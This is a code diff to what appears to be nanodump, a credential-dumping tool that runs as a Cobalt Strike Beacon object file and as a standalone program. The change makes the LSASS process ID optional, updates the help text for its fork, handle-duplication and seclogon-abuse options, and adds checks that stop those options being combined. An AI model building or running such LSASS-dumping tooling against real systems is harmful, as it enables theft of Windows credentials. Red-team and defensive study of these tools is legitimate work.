@@ -874,9 +874,10 @@ void go(char* args, int length)
     use_seclogon = (BOOL)BeaconDataInt(&parser);
     nanodump_binary = BeaconDataExtract(&parser, NULL);
 
-    if (get_pid_and_leave)
+    // if not provided, get the PID of LSASS
+    if (!pid)
     {
-        DWORD pid = get_lsass_pid();
+        pid = get_lsass_pid();
         if (!pid)
         {
             BeaconPrintf(
@@ -885,6 +886,10 @@ void go(char* args, int length)
             );
             return;
         }
+    }
+
+    if (get_pid_and_leave)
+    {
         BeaconPrintf(
             CALLBACK_OUTPUT,
             "LSASS PID: %ld\n",
@@ -1026,14 +1031,16 @@ void usage(char* procname)
     printf("            full path to the dumpfile\n");
     printf("    --valid, -v\n");
     printf("            create a dump with a valid signature (optional)\n");
+    printf("    --pid PID, -p PID\n");
+    printf("            the PID of LSASS (optional)\n");
+    printf("    --getpid\n");
+    printf("            print the PID of LSASS and leave (optional)\n");
     printf("    --fork, -f\n");
     printf("            fork target process before dumping (optional)\n");
     printf("    --dup, -d\n");
     printf("            duplicate an existing LSASS handle (optional)\n");
-    printf("    --pid PID, -p PID\n");
-    printf("            the PID of LSASS (required if --fork or --dup are used)\n");
     printf("    --seclogon, -sl\n");
-    printf("            obtain a handle to LSASS by (ab)using seclogon\n");
+    printf("            obtain a handle to LSASS by (ab)using seclogon (optional)\n");
     printf("    --help, -h\n");
     printf("            print this help message and leave");
 }
@@ -1129,15 +1136,25 @@ int main(int argc, char* argv[])
         }
     }
 
-    if (get_pid_and_leave)
+    // if not provided, get the PID of LSASS
+    if (!pid)
     {
-        DWORD pid = get_lsass_pid();
+        pid = get_lsass_pid();
         if (!pid)
         {
-            printf("Failed to find the PID of LSASS.\n");
+            printf(
+                "Failed to find the PID of LSASS.\n"
+            );
             return -1;
         }
-        printf("LSASS PID: %ld\n", pid);
+    }
+
+    if (get_pid_and_leave)
+    {
+        printf(
+            "LSASS PID: %ld\n",
+            pid
+        );
         return 0;
     }
 
@@ -1154,21 +1171,15 @@ int main(int argc, char* argv[])
         return -1;
     }
 
-    if (fork && !pid)
+    if (dup && use_seclogon)
     {
-        printf("Process forking requires a PID. Run with --getpid first.\n");
+        printf("Can't set both --dup and --seclogon\n");
         return -1;
     }
 
-    if (dup && !pid)
+    if (fork && use_seclogon)
     {
-        printf("Handle duplication requires a PID. Run with --getpid first.\n");
-        return -1;
-    }
-
-    if (use_seclogon && !is_seclogon_stage_2 && !pid)
-    {
-        printf("Seclogon requires a PID\n");
+        printf("Can't set both --fork and --seclogon\n");
         return -1;
     }
 
